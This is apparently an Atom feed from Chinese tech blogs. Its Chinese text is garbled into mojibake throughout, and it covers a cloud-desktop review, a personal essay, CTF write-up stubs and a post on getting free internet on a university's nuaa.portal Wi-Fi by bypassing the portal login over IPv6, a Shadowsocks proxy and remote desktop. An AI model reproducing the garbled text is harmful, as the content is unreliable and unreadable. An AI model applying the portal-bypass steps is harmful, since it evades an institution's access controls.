ECSÔºåÂª∂ËøüÂæàÂ∞èÔºåÂèØ‰ª•ÂøΩÁï•ÔºåËÄå‰∏îÁîªË¥®ÂæàÊ∏ÖÊô∞ÔºåÊöÇÊó∂Ê≤°Êúâ‰ªÄ‰πàÁîªÈù¢Âç°È°ø„ÄÇËá≥‰∫é‰∏ãË°åÁΩëÁªúÔºåÁî±‰∫éËøôÊòØÈòøÈáå‰∫ëÁöÑ‰∏ìÁ∫øÔºåÊØîÂÆ∂Áî®ËøêËê•ÂïÜÁΩëÁªúÂ•ΩÂ§™Â§öÔºå‰∏ãËΩΩÈÄüÂ∫¶ÂóñÂóñÁöÑÔºå‰∏çÁÆ°ÂõΩÂÜÖÂ§ñ„ÄÇ</p><p>ËÆ°ÁÆóÊÄßËÉΩÊñπÈù¢ÔºåÂú®ÊàëÊú¨Âú∞Êú∫Âô®‰∏äÔºåVSCode ÁöÑ Python Êèí‰ª∂ÔºåËøõË°å‰∏ÄÊ¨°Êñá‰ª∂ÈîôËØØÊâ´ÊèèÈúÄË¶Å 5 ÁßíÂ∑¶Âè≥ÔºåËÄåËøôÂè∞‰∫ëÊ°åÈù¢ÔºåÂè™Ë¶Å 1 Áßí„ÄÇ</p><p>Êìç‰ΩúÁ≥ªÁªüÊñπÈù¢ÔºåWindows Server ÊØî Windows PC ÁÆÄÊ¥ÅÂæàÂ§öÔºåÊ≤°Êúâ‰π±‰∏ÉÂÖ´Á≥üÁöÑÊúçÂä°Ôºå‰ΩÜ‰πüÊ≤°ÊúâÁº∫Â∞ëÊó•Â∏∏ÂºÄÂèëÊâÄÈúÄÁöÑÈáçË¶ÅÁªÑ‰ª∂„ÄÇÂèØËÉΩ‰ºöÊúâÁÇπ‰∏ç‰∏ÄÊ†∑Ôºå‰ΩÜÊòØÂ¶ÇÊûúÂá∫ÈóÆÈ¢òÔºå‰∏ÄËà¨ËÉΩÂæàÂø´Ëß£ÂÜ≥„ÄÇÊØîÂ¶ÇÊàëÂú®ÂÆâË£Ö Python Êó∂Âá∫ÈîôÔºåGoogle ‰∏Ä‰∏ã‰æøÁü•Ë¶ÅÁõ¥Êé•‰ª•ÁÆ°ÁêÜÂëòË∫´‰ªΩÊâìÂºÄ„ÄÇ</p><p>‰ª•‰∏ãÊà™ÂõæËá™ÊàëÁöÑ‰∫ëÊ°åÈù¢„ÄÇ</p><p><img src="https://img.vvzero.com/ih/2020/02/09/d3b52ba297968.png" alt="Screenshot _1_.png"></p><p><img src="https://img.vvzero.com/ih/2020/02/09/e9ae18b879037.png" alt="Screenshot _3_.png"></p><p><img src="https://img.vvzero.com/ih/2020/02/09/9f2c0741b0057.png" alt="Screenshot _4_.png"></p><p><img src="https://img.vvzero.com/ih/2020/02/09/8109324fabb58.png" alt="Screenshot _2_.png"></p><h3 id="ÊèêÈ´ò‰ΩìÈ™åÁöÑÂèØÈÄâÈ°π"><a href="#ÊèêÈ´ò‰ΩìÈ™åÁöÑÂèØÈÄâÈ°π" class="headerlink" title="ÊèêÈ´ò‰ΩìÈ™åÁöÑÂèØÈÄâÈ°π"></a>ÊèêÈ´ò‰ΩìÈ™åÁöÑÂèØÈÄâÈ°π</h3><ol><li>ÂÖ≥Èó≠ Windows ÁöÑËøáÊ∏°Âä®ÁîªÔºåËøôÂú®ËøúÁ®ãÊ°åÈù¢‰∏ä‰ºöÂØºËá¥Âç°È°øÔºå‰∏î‰ºöÊ∂àËÄóÂ§ßÈáèÁöÑÊµÅÈáèË¥πÔºõ</li><li>ÂÆâÂÖ®Ëµ∑ËßÅÔºåÈáçÊñ∞ÂàõÂª∫‰∏Ä‰∏™ÁÆ°ÁêÜÂëòÁî®Êà∑Âπ∂Á¶ÅÁî® Administrator Áî®Êà∑Ôºõ</li><li>Áî®Â•ΩÂêÑÁßç‰∫ëÂêåÊ≠•ÂäüËÉΩÔºåÊØîÂ¶Ç Git ‰ªìÂ∫ì„ÄÅÊµèËßàÂô®‰∫ëÂêåÊ≠•„ÄÅ‰∫ëÁõòÁ≠â„ÄÇ</li></ol><h2 id="ÂÆûÊµã‰ª∑Ê†º"><a href="#ÂÆûÊµã‰ª∑Ê†º" class="headerlink" title="ÂÆûÊµã‰ª∑Ê†º"></a>ÂÆûÊµã‰ª∑Ê†º</h2><p>ÊàëÊ≠£Â∏∏‰ΩøÁî®‰∫Ü‰∏ÄÂ§©ÔºåÊôö‰∏äÂÅúÊú∫‰∏çÊî∂Ë¥πÔºåÊ∂àË¥πÂ¶Ç‰∏ãÔºö</p><p><img src="https://img.vvzero.com/ih/2020/02/09/176c67e7015fa.png" alt="Snipaste_2020-02-09_18-54-30.png"></p><p><img src="https://img.vvzero.com/ih/2020/02/09/140f26bd1d962.png" alt="Snipaste_2020-02-09_18-55-07.png"></p><p>ÂèØËßÅÔºåÊàë‰∏ÄÂ§©Â§ßËá¥Ê∂àË¥π5ÂÖÉ„ÄÇ</p><h2 id="ÂêéËÆ∞"><a href="#ÂêéËÆ∞" class="headerlink" title="ÂêéËÆ∞"></a>ÂêéËÆ∞</h2><p>Á°ÆÂÆû‰∏çÊòØÂæàË¥µÔºåÂèØË°åÊÄß‰πüÂæàÈ´ò„ÄÇÂÅáÂ¶ÇÊúâÊ®°ÂûãÊ∏≤ÊüìÈúÄÊ±ÇÔºåÁîöËá≥ÂèØ‰ª•ÁªëÂÆö‰∏™ÊòæÂç°Ôºà</p><p>Êä¢Âç†ÂºèÂÆû‰æã‰πü‰∏çÊòØÂæàÂèØÊÄïÂêßÔºüÊàëÁöÑÂÆû‰æãÁõÆÂâçÊ≤°Ë¢´ÂõûÊî∂„ÄÇ</p><p>Âè¶Â§ñÔºåÊúâ‰∫∫ÊÉ≥Ë∑üÊàëÂêàÁßüÂêóÔºü</p>]]></content>
        <author>
            <name><![CDATA[VVBLOG]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.vvzero.com/2019/05/23/thinking-in-20190523/</id>
        <title><![CDATA[20190523 ÈöèÊÉ≥]]></title>
        <updated>2020-04-28T05:26:07+08:00</updated>
        <link href="https://blog.vvzero.com/2019/05/23/thinking-in-20190523/"/>
        <content type="text/html" src="https://blog.vvzero.com/2019/05/23/thinking-in-20190523/"><![CDATA[<p>ÂõõÂπ¥‰πãÂâçÔºåÊàëÈ´ò‰∫åÁöÑÊó∂ÂÄôÔºå‰∏ÄÂ§©ÂÇçÊôöÊîæÂ≠¶ÔºåÊàëË∑üÂΩìÊó∂ÊïôÊàëÂåñÂ≠¶ÁöÑ6ËÄÅÂ∏àÔºà‰ª£Áß∞ÔºâÔºåÂºÄÁé©Á¨ëÂºèÂú∞Ëµ∑‰∫Ü‰∫âÊâß„ÄÇ6ËÄÅÂ∏à‰∫∫ÂæàÂ•ΩÔºåÊàë‰ª¨ÈÉΩË∑ü‰ªñÁß∞ÂÖÑÈÅìÂºüÁöÑ„ÄÇËµ∑Âõ†ÊòØÔºå6ËÄÅÂ∏àÂêëÊàë‰ª¨ÁßÄ‰ªñÊñ∞‰π∞ÁöÑÁêÉÈûãÔºåÂæàÈÖ∑ÔºåÊòØÊüê‰∏™Êó•Êú¨ÂêçÁâå„ÄÇÂΩìÊó∂ÁöÑÊàëÁ¨ëÈÅìÔºö‚ÄúÊó•Ë¥ßÂïäÔºå‰∏çËÉΩÁ©øÂïäÔºÅ‚ÄùÔºàÂΩìÊó∂ÁöÑÂ≠¶Áîü‰∏≠Èó¥ÔºåËøôÊ†∑ÁöÑÊÄùÊÉ≥Ê∞õÂõ¥ËøòÊØîËæÉÊµìÔºâ„ÄÇ</p><p>6ËÄÅÂ∏àÁ´ãÂàªÂ∞±ÂèçÈ©≥‰∫ÜÔºö‚Äú‰∏∫‰ªÄ‰πà‰∏çËÉΩÁ©øÔºü‚Äù‚Äú‰∏úË•øÂ•ΩÁî®Ôºå‰∏∫‰ªÄ‰πà‰∏ç‰π∞Ôºü‚ÄùÂΩìÊó∂ÊàëËøòÊúâ‰∏Ä‰∫õÁé∞Âú®ÁúãÊù•ÂèØÁ¨ëÁöÑËØùÔºåÈÉΩË¢´6ËÄÅÂ∏à‚ÄúËÆΩÂà∫‚Äù‰∫Ü‰∏ÄÁï™„ÄÇÊàë‰ªç‰∏çÊúçÊ∞îÔºåË¶Å‰∫âËæ©Ôºå6ËÄÅÂ∏àÂØπÊàëËØ¥Ôºö‚ÄúÂæàÂ§ö‰Ω†ÁúãÂà∞ÁöÑ‰∫ãÊÉÖÔºåÂπ∂‰∏ç‰∏ÄÂÆöÊòØÁúüÁöÑ‚Ä¶‚Ä¶ÊòØË¢´‰øÆÈ•∞ËøáÁöÑ‚Ä¶‚Ä¶‚Äù</p><p>ÊàëÂ§ßËá¥Âê¨ÊáÇ‰∫Ü‰ªñÁöÑÊÑèÊÄùÔºå‰ΩÜËøõ‰∏ÄÊ≠•ÈóÆÔºö‚ÄúÊó¢ÁÑ∂ÂêÑÁßçÂéÜÂè≤„ÄÅ‰∫ãÊÉÖÈÉΩ‰ºöË¢´‰øÆÈ•∞ÔºåÈÇ£‰πàÊàë‰ª¨ÊÄé‰πàÊâçËÉΩÁü•ÊôìÁúüÂÆûÁöÑÊÉÖÂÜµÂë¢ÔºüÊØïÁ´üÔºå‰∏çÁÆ°Âì™‰∏ÄÊñπËØ¥Âá∫ÁöÑËØùÔºåÈÉΩÊúâÂèØËÉΩÂõ†‰∏∫Ë¶ÅÁ¨¶ÂêàÂÖ∂Âà©ÁõäËÄåÂ∞ÜÂÖ∂‰øÆÈ•∞„ÄÇ‚Äù</p><p>6ËÄÅÂ∏àËØ¥Ôºö‚ÄúË¶ÅÊÄùËÄÉÔºåÂ≠¶‰ºöÊÄùËÄÉÔºÅ‚Äù</p><p>‚Ä¶‚Ä¶</p><p>ÊàëÂΩìÊó∂‰∏ç‰ª•‰∏∫ÁÑ∂ÔºåÊÄùËÄÉÔºüÊÄé‰πàÊÄùËÄÉÂòõÔºÅ</p><p>ÂêéÊù•ÊàëÊÖ¢ÊÖ¢Áü•ÈÅì‰∫ÜÔºåÁõ¥Âà∞Áé∞Âú®ÔºåÊàëÈÉΩÂæàËÆ§ÂèØ6ËÄÅÂ∏àÔºåÊàëËßâÂæó‰ªñÂæàÂØπ„ÄÇ</p><p>‰∏çÁÆ°ÊòØ‰ªÄ‰πàÔºåÈÉΩ‰ºöË¢´‰∫∫‰øÆÈ•∞ÔºåÂè™ÊúâËá™ÁÑ∂ÁßëÂ≠¶‰∏çËÉΩË¢´‰øÆÈ•∞„ÄÇÂ∞±ÂÉèÔºå‰∏çÁÆ°ÊòØË∞ÅÔºå‰πü‰∏çËÉΩËÆ©‰∫∫Áõ∏‰ø° 1+1=3ÔºåËøôÊòØÊï∞Â≠¶„ÄÇÁâ©ÁêÜ„ÄÅÂåñÂ≠¶Á≠âÂÖ∂‰ªñËá™ÁÑ∂ÁßëÂ≠¶ÁöÑÂéüÁêÜÔºå‰πÉËá≥ÁªèÊµéÂ≠¶ÂéüÁêÜÔºåÈÉΩ‰∏çËÉΩË¢´‰øÆÈ•∞„ÄÇ</p><p>‰πüËÆ∏ÊÄùËÄÉÔºåÂ∞±ÊòØË¶Å‰ªéËá™ÁÑ∂ÁßëÂ≠¶Á´ãË∂≥ÂêßÔºü</p><p>Â∞±ÊØîÂ¶Ç‰ªéÊï∞Â≠¶ÈÄªËæëÈáåÂª∂Áî≥‚Äî‚Äî‰ªª‰Ωï‰∫ãÊÉÖÈÉΩÊòØÊúâÈÄªËæëÁöÑÔºåÈÉΩÂ∫îÊúâÂâçÂõ†ÂêéÊûú„ÄÇÂΩì‰∏Ä‰ª∂‰∫ãÂèëÁîüÊó∂Ôºå‰πüËÆ∏Âë®Âõ¥‰∫∫ÈÉΩ‰ºöËÆ≤Ëø∞‚ÄúËøô‰ª∂‰∫ãÂèëÁîü‰∫Ü‚ÄùÔºåÂèØÂç¥È≤úÊúâ‰∫∫ËøΩÊ∫ØÔºåËøô‰ª∂‰∫ã‰∏∫‰ªÄ‰πàÂèëÁîüÔºüÂΩìÂÖ®Á§æ‰ºöÈÉΩÂú®‰∏∫Ëøô‰ª∂‰∫ãÁó¥ÁãÇÔºå‰πÉËá≥Ë¶ÅÂ∞ÜËøô‰ª∂‰∫ã‰Ωú‰∏∫‚ÄúÂéüÂõ†‚ÄùÔºåÈááÂèñË°åÂä®Ôºà‰∫ßÁîüÊñ∞ÁöÑ‚ÄúÁªìÊûú‚ÄùÔºâÊó∂ÔºåËøòÊòØÊ≤°ÊúâÂ§öÂ∞ë‰∫∫ÂéªÂÖ≥Ê≥®Ëøô‰ª∂‰∫ãÁöÑÊ†πÊú¨ÂéüÂõ†„ÄÅÂéÜÂè≤ÂéüÂõ†„ÄÅÁõ¥Êé•ÂéüÂõ†‰πãÈó¥ÁöÑÂÖ≥Á≥ª„ÄÇÁÑ∂ÂêéÔºåÁªùÂ§ßÂ§öÊï∞‰∫∫ÈÉΩË¢´ÈºìÂä®Ëµ∑Êù•‰∫ÜÔºåÂ∞±ÂÉèÂõõÂπ¥ÂâçÁöÑÊàëÔºåÂéªÁ¨ë6ËÄÅÂ∏à‚Ä¶‚Ä¶</p><p>ËßÇÂØüË∫´ËæπÁöÑÂêÑÁßçÂèòÂåñÔºåÂêÑÁßçËá™ÁÑ∂ÁéØÂ¢ÉÁ§æ‰ºöÁéØÂ¢ÉÁöÑÂèòÂåñÔºåÂêÑÁßçËÆ©‰∫∫ÂºÄÂøÉÊàñÈöæÂèóÊàñÈÑôÂ§∑ÁöÑ‰∫ãÔºåÂéªÊÄùËÄÉÔºå‚Äú‰∏∫‰ªÄ‰πà‰ºöËøôÊ†∑Ôºü‚Äù</p><p>‰πüËÆ∏ËøôÂ∞±ÊòØÊâÄË∞ì‚ÄúÁêÜÊÄß‚ÄùÔºü</p><p>Êàë‰∏çÁü•ÈÅìÂá†ÁôæÂπ¥ÂâçÊ¨ßÊ¥≤ÂêØËíôËøêÂä®ÊèêÂÄ°ÁöÑ‚ÄúÁêÜÊÄß‚ÄùÊòØÂê¶Â∞±ÊòØ‰∏∫‰∫ÜËß£ÂÜ≥ËøôÊ†∑ÁöÑÈóÆÈ¢ò„ÄÇ</p><p>‚ÄúË¶ÅÊÄùËÄÉÔºåÂ≠¶‰ºöÊÄùËÄÉÔºÅ‚Äù</p>]]></content>
        <author>
            <name><![CDATA[VVBLOG]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.vvzero.com/2019/01/13/Use-the-Internet-via-nuaa-portal-for-free/</id>
        <title><![CDATA[ÂÖçË¥π‰ΩøÁî® nuaa.portal ‰∏äÁΩë]]></title>
        <updated>2020-04-28T05:26:07+08:00</updated>
        <link href="https://blog.vvzero.com/2019/01/13/Use-the-Internet-via-nuaa-portal-for-free/"/>
        <content type="text/html" src="https://blog.vvzero.com/2019/01/13/Use-the-Internet-via-nuaa-portal-for-free/"><![CDATA[<h2 id="ËÉåÊôØ"><a href="#ËÉåÊôØ" class="headerlink" title="ËÉåÊôØ"></a>ËÉåÊôØ</h2><p>Â≠¶Ê†°Ëµê‰∫àÊàëÁöÑ nuaa.portal Ë¥¶Âè∑Âú®‰∏Ä‰∏™Êúà‰πãÂâçÂ∞±Âà∞Êúü‰∫ÜÔºåËøô‰∏Ä‰∏™ÊúàÂÜÖÔºåËôΩÁÑ∂ÂØπÊàëÁöÑÁîüÊ¥ªÊ≤°ÊúâÂ§™Â§ßÁöÑÂΩ±ÂìçÔºå‰ΩÜÊòØËøòÊòØÊÑüÂèóÂà∞‰∫ÜÊüê‰∫õ‰∏ç‰æøÔºàÊÄªËßâÂæóÊüê‰∫õ‰∏úË•øÊúâ‰∫ÜÊõ¥Â•ΩÔºåÊ≤°ÊúâÂç¥‰∏çËÉΩÊãâÂÄíÔºâ„ÄÇÂâç‰∫õÂ§©Ë∑üÂàõÊñ∞Âå∫ÂÜÖÁöÑÂêåÂ≠¶ËÆ®ËÆ∫‰∫ÜÊú¨Ê†°ÁöÑipv6ÈÉ®ÁΩ≤ÊÉÖÂÜµÔºåÁ™ÅÁÑ∂Â∞±ÊúâÂÖ¥Ëá¥Êù•ÊäòËÖæ‰∏Ä‰∏ã„ÄÇ</p><p>Ê≤°ÈîôÔºåÂÖçË¥π‰∏äÁΩëËøòÊòØÊúâÂèØËÉΩÁöÑ„ÄÇ</p><h2 id="ÂâçÊèêÊ¶ÇË¶Å"><a href="#ÂâçÊèêÊ¶ÇË¶Å" class="headerlink" title="ÂâçÊèêÊ¶ÇË¶Å"></a>ÂâçÊèêÊ¶ÇË¶Å</h2><ul><li>Â≠¶Ê†°ÁöÑ nuaa.portal ÂÖ¨ÂÖ±Êó†Á∫øÁΩëÔºåWindows ÁîµËÑëÂè™Ë¶ÅËøûÊé•‰∏äÔºåÂ∞±ËÉΩËé∑Âèñ‰∏Ä‰∏™ ipv4 ÂÜÖÁΩëÂú∞ÂùÄÂíå‰∏Ä‰∏™ ipv6 Âú∞ÂùÄ„ÄÇÂ¶ÇÊûúÊ≤°ÊúâÂú®ÊåáÂÆö Web È°µÈù¢‰∏äËÆ§ËØÅÔºåÂàôÊó†Ê≥ï‰ΩøÁî® ipv4 ËøûÊé•‰∫íËÅîÁΩë„ÄÇ‰ΩÜÊòØÂèØ‰ª•ÈÄöËøá ipv6 ËÅîÁΩë„ÄÇ</li><li>Â≠¶Ê†°ÈªòËÆ§‰∏çÂàÜÈÖç ipv6 ÁöÑ DNS ÊúçÂä°Âô®„ÄÇ</li><li>Â≠¶Ê†°ÊïôÂ≠¶ÂäûÂÖ¨Âå∫ÊúâÁ∫øÂÆΩÂ∏¶ÔºåÁªèÁõ¥Êé•Êã®Âè∑ÔºåÂêåÊ†∑ÂèØ‰ª•Ëé∑Âæó‰∏Ä‰∏™ ipv4 ÂÜÖÁΩëÂú∞ÂùÄÂíå‰∏Ä‰∏™ ipv6 Âú∞ÂùÄÔºåÂùáÂèØ‰ª•ËÆøÈóÆ‰∫íËÅîÁΩë„ÄÇ</li></ul><h2 id="‰∏ÄÊ≠•Ê≠•ÁöÑÂ∞ùËØï"><a href="#‰∏ÄÊ≠•Ê≠•ÁöÑÂ∞ùËØï" class="headerlink" title="‰∏ÄÊ≠•Ê≠•ÁöÑÂ∞ùËØï"></a>‰∏ÄÊ≠•Ê≠•ÁöÑÂ∞ùËØï</h2><h3 id="Áõ¥Êé•Áî®-ipv6-‰∏äÊèê‰æõ-ipv6-ÊúçÂä°ÁöÑÁΩëÁ´ô"><a href="#Áõ¥Êé•Áî®-ipv6-‰∏äÊèê‰æõ-ipv6-ÊúçÂä°ÁöÑÁΩëÁ´ô" class="headerlink" title="Áõ¥Êé•Áî® ipv6 ‰∏äÊèê‰æõ ipv6 ÊúçÂä°ÁöÑÁΩëÁ´ô"></a>Áõ¥Êé•Áî® ipv6 ‰∏äÊèê‰æõ ipv6 ÊúçÂä°ÁöÑÁΩëÁ´ô</h3><p>Êó¢ÁÑ∂ÂèØ‰ª•‰ªé nuaa.portal Ëé∑ÂèñÂèØ‰ª•ËÆøÈóÆ‰∫íËÅîÁΩëÁöÑ ipv6 Âú∞ÂùÄÔºåÈÇ£‰πàÊúÄÁÆÄÂçïÁöÑÊÄùË∑ØÔºåÂ∞±ÊòØÁõ¥Êé•‰ΩøÁî®ËøôÊù°ÈÄöÈÅì„ÄÇ‰ΩÜÊòØÔºåÁî±‰∫éÂ≠¶Ê†°Ê≤°Êúâ ipv6 ÁöÑ DNSÔºàËÆ§ËØÅÂêéÔºåÂ¶ÇÊûúËÆøÈóÆ ipv6 Á´ôÁÇπÔºåÂÖ∂ÂÆû‰ªçÁÑ∂ÊòØ‰ΩøÁî® ipv4 ÁöÑ DNS ÊúçÂä°Âô®ÔºâÔºåÊïÖÂøÖÈ°ªÈÖçÁΩÆ ipv6 ÁöÑ DNS„ÄÇËøô‰∏ÄÁÇπÂæàÁÆÄÂçïÔºåÁõ¥Êé•‰øÆÊîπ DNS ÊúçÂä°Âô®Âç≥ÂèØÔºö</p><p><img src="https://img.vvzero.com/Use-the-Internet-via-nuaa-portal-for-free_2.png" alt></p><p>ËøôÈáåÊé®Ëçê‰∏§‰∏™ ipv6 ÁöÑ DNS ÊúçÂä°Âô®Ôºå‰∏Ä‰∏™ÊòØ Google ÂÆ∂ÁöÑÔºå‰∏Ä‰∏™ÊòØÊ∏ÖÂçéÂ§ßÂ≠¶ TUNA Âçè‰ºöÁöÑÔºö</p><ul><li><code>2001:4860:4860::8888</code></li><li><code>2001:da8::666</code></li></ul><p>ÁÑ∂ÂêéÔºåÂÆûÊµãÂ∞±ÂèØ‰ª•ËÆøÈóÆÊèê‰æõ ipv6 ÊúçÂä°ÁöÑÁΩëÁ´ôÂï¶ÔºÅ</p><p>ÊØîÂ¶ÇÔºö</p><ul><li>google.com.hk</li><li><a href="http://www.youtube.com" target="_blank" rel="noopener">www.youtube.com</a></li><li>ipv6.baidu.com</li><li>ipv6.mirrors.ustc.edu.cn</li></ul><h3 id="‰ΩøÁî®-ipv6-‰ª£ÁêÜÊúçÂä°Âô®ËøõË°åÊó†ÈôêÂà∂ÁöÑ‰∫íËÅîÁΩëËÆøÈóÆ"><a href="#‰ΩøÁî®-ipv6-‰ª£ÁêÜÊúçÂä°Âô®ËøõË°åÊó†ÈôêÂà∂ÁöÑ‰∫íËÅîÁΩëËÆøÈóÆ" class="headerlink" title="‰ΩøÁî® ipv6 ‰ª£ÁêÜÊúçÂä°Âô®ËøõË°åÊó†ÈôêÂà∂ÁöÑ‰∫íËÅîÁΩëËÆøÈóÆ"></a>‰ΩøÁî® ipv6 ‰ª£ÁêÜÊúçÂä°Âô®ËøõË°åÊó†ÈôêÂà∂ÁöÑ‰∫íËÅîÁΩëËÆøÈóÆ</h3><p>‰∏ä‰∏ÄÊù°ÊñπÊ≥ïËôΩÁÑ∂ÁÆÄÂçïÔºå‰ΩÜÊòØÂè™ËÉΩËÆøÈóÆÊèê‰æõ ipv6 ÁöÑÁΩëÁ´ôÔºåÁÑ∂ËÄåÁé∞Âú®ÂõΩÂÜÖ‰πÉËá≥ÂõΩÈôÖ‰∏äÂ§ßÂ§öÊï∞ÁΩëÁ´ôÂπ∂Ê≤°ÊúâÊèê‰æõ ipv6 ÊúçÂä°ÔºåËá≥Â∞ëÔºå‰Ω†ÁõÆÂâçËøò‰∏çËÉΩÁôªÂæÆ‰ø°„ÄÇ</p><p>‰ΩÜÊòØÔºåÂ¶ÇÊûúÊúâ‰∏Ä‰∏™ÂêåÊó∂ÂÖ∑ÊúâÊúâ ipv6 Âíå ipv4 ÁöÑ‰ª£ÁêÜÊúçÂä°Âô®Ôºå‰∏çÂ∞±‰∏ÄÂàáÈÉΩËß£ÂÜ≥‰∫ÜÂêóÔºüÊääÊú¨Âú∞ÁöÑÊâÄÊúâÊµÅÈáèÈÉΩÈÄöËøá ipv6 ËΩ¨ÂèëËá≥‰ª£ÁêÜÊúçÂä°Âô®ÔºåÁÑ∂ÂêéÂ∞±ÂèØ‰ª•ËÆøÈóÆ‰ªªÊÑèÁ´ôÁÇπ‰∫ÜÔºÅ</p><p>ËøôÈáåÔºåÊàëÂÄüÁî®‰∫Ü ShadowsocksÔºåÈÖçÁΩÆ‰∫Ü‰∏ÄÂè∞Êúâ ipv6 Âíå ipv4 ÁöÑÊúçÂä°Âô®ÔºåÁÑ∂ÂêéÊú¨Âú∞ÂºÄÂêØÂÖ®Â±Ä‰ª£ÁêÜÔºåÂÆûÈôÖÂ∞±ÂèØ‰ª•ËÆøÈóÆ‰ªªÊÑèÁ´ôÁÇπ‰∫Ü„ÄÇ</p><p>‰ΩøÁî®Ëøô‰∏™ÊñπÊ≥ïÔºåÊú¨Âú∞ DNS ÁîöËá≥ÈÉΩ‰∏çÈúÄË¶ÅÈÖçÁΩÆ„ÄÇ</p><h3 id="ÁªàÊûÅÔºàÁ°¨Ê†∏ÔºâËπ≠ÁΩëÊñπÊ°à"><a href="#ÁªàÊûÅÔºàÁ°¨Ê†∏ÔºâËπ≠ÁΩëÊñπÊ°à" class="headerlink" title="ÁªàÊûÅÔºàÁ°¨Ê†∏ÔºâËπ≠ÁΩëÊñπÊ°à"></a>ÁªàÊûÅÔºàÁ°¨Ê†∏ÔºâËπ≠ÁΩëÊñπÊ°à</h3><p>ËøòËÆ∞Âæó‰∏ÄÂºÄÂßãÊàëËØ¥ËøáÔºåÊïôÂ≠¶ÂäûÂÖ¨Âå∫‰πüËÉΩËé∑Âæó ipv6 Âú∞ÂùÄÂêóÔºü</p><p>ÂØπÔºåÊàëÂ∞±ÊòØÊÉ≥Áî®ËøúÁ®ãÊ°åÈù¢ÔºÅ</p><p><img src="https://img.vvzero.com/Use-the-Internet-via-nuaa-portal-for-free_1.jpg" alt></p><p>ÊàëÂú®Â≠¶Ê†°ÂàõÊñ∞Âå∫Êó•Â∏∏ÂºÄÁùÄ‰∏ÄÂè∞Êú∫Âô®ÔºåÊã®Âè∑ËÅîÁΩëÔºåÔºàÊÄßËÉΩËøò‰∏çÈîôÔºâ„ÄÇ</p><p>emmmÔºåÂÖ∂ÂÆûËøô‰∏™ÊñπÊ≥ïÁúüÁöÑÂæàÁ°¨Ê†∏ÂæàÊúâÊïàÔºåËÄå‰∏îÔºåÁî±‰∫é nuaa.portal ÂíåÊïôÂ≠¶ÂäûÂÖ¨Âå∫ÂÆûÈôÖÂ±û‰∫éÂêå‰∏Ä‰∏™Â§ßÁöÑÂÜÖÁΩëÁéØÂ¢ÉÔºåÂ≠¶Ê†°ÁöÑË∑ØÁî±Âô®Ëøò‰∏çÈîôÔºåÂÆûÊµã ping Âª∂ËøüÂè™Êúâ 2msÔºåÂÆåÂÖ®Êª°Ë∂≥‰∫ÜÊó•Â∏∏ÁîµËÑë‰ΩøÁî®ÔºàÈô§‰∫Ü‰∏çËÉΩ‰ΩøÁî®ÊòæÂç°Áé©Ê∏∏Êàè‰ªÄ‰πàÁöÑÔºâ„ÄÇÂæÆËΩØÂÆ∂ÁöÑËøúÁ®ãÊ°åÈù¢ËøòÊòØÂæàÂº∫Â§ßÁöÑÔºÅ</p><h2 id="ÊúÄÂêé"><a href="#ÊúÄÂêé" class="headerlink" title="ÊúÄÂêé"></a>ÊúÄÂêé</h2><p>ÊàëÂÖ∂ÂÆûËøòÊòØÊÉ≥ÂÜçÊù•‰∏ÄÂπ¥ÁöÑÂÖçË¥π nuaa.portal Ë¥¶Âè∑ÁöÑ„ÄÇ</p>]]></content>
        <author>
            <name><![CDATA[VVBLOG]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://miaotony.xyz/2020/04/25/CTF_2020DASCTF_April/</id>
        <title><![CDATA[CTF | 2020 DASCTF ÂõõÊúàÊò•Â≠£Êàò Re&Misc WriteUp]]></title>
        <updated>2020-04-26T12:18:11+08:00</updated>
        <link href="https://miaotony.xyz/2020/04/25/CTF_2020DASCTF_April/"/>
        <content type="text/html" src="https://miaotony.xyz/2020/04/25/CTF_2020DASCTF_April/"><![CDATA[‰ªäÂ§©‰∏ãÂçàÊúâ‰∏™ DASCTF ÂÆâÊÅíÊúàËµõÔºåÈöæÂ∫¶ÊçÆËØ¥‚ÄúÈõ®Èú≤ÂùáÊ≤æ‚ÄùÔºåÂ∞±Êù•Áúã‰∫ÜÁúãÈ¢òÔºåÂÅö‰∫ÜÂá†‰∏™ReÂíåMiscÁöÑÈ¢òÔºåÂàí‰∏™Ê∞¥„ÄÇ]]></content>
        <author>
            <name><![CDATA[MiaoTony]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://miaotony.xyz/2020/04/21/CTF_2020Ha1cyonCTF/</id>
        <title><![CDATA[CTF | 2020 Ha1cyon_CTFÂÖ¨ÂºÄËµõ WriteUp]]></title>
        <updated>2020-04-22T06:06:43+08:00</updated>
        <link href="https://miaotony.xyz/2020/04/21/CTF_2020Ha1cyonCTF/"/>
        <content type="text/html" src="https://miaotony.xyz/2020/04/21/CTF_2020Ha1cyonCTF/"><![CDATA[Âë®Êú´Áúã‰∫Ü‰∏Ä‰∏ãHa1cyon_CTF‚ÄúËêåÊñ∞‚ÄùÂÖ¨ÂºÄËµõÁöÑÈ¢òÁõÆÔºåÂèëÁé∞ÊòØ‰∏Ä‰∏™ÈöæÂà∞ÁàÜÁÇ∏ÁöÑËπ≤WPÂäùÈÄÄÊØîËµõ„ÄÇÂ∞±ÂÜôÂÜôÈÉ®ÂàÜWPÔºåÂÜçÊù•ÁÇπÂ∞è‰Ωì‰ºöÂêß„ÄÇ]]></content>
        <author>
            <name><![CDATA[MiaoTony]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.logicjake.xyz/2020/04/21/%E5%A4%A9%E6%B1%A0%E4%BA%8C%E6%89%8B%E8%BD%A6%E4%BA%A4%E6%98%93%E4%BB%B7%E6%A0%BC%E9%A2%84%E6%B5%8B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/</id>
        <title><![CDATA[Â§©Ê±†‰∫åÊâãËΩ¶‰∫§Êòì‰ª∑Ê†ºÈ¢ÑÊµã-ËµõÂêéÊÄªÁªì]]></title>
        <updated>2020-04-21T13:42:03+08:00</updated>
        <link href="https://www.logicjake.xyz/2020/04/21/%E5%A4%A9%E6%B1%A0%E4%BA%8C%E6%89%8B%E8%BD%A6%E4%BA%A4%E6%98%93%E4%BB%B7%E6%A0%BC%E9%A2%84%E6%B5%8B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"/>
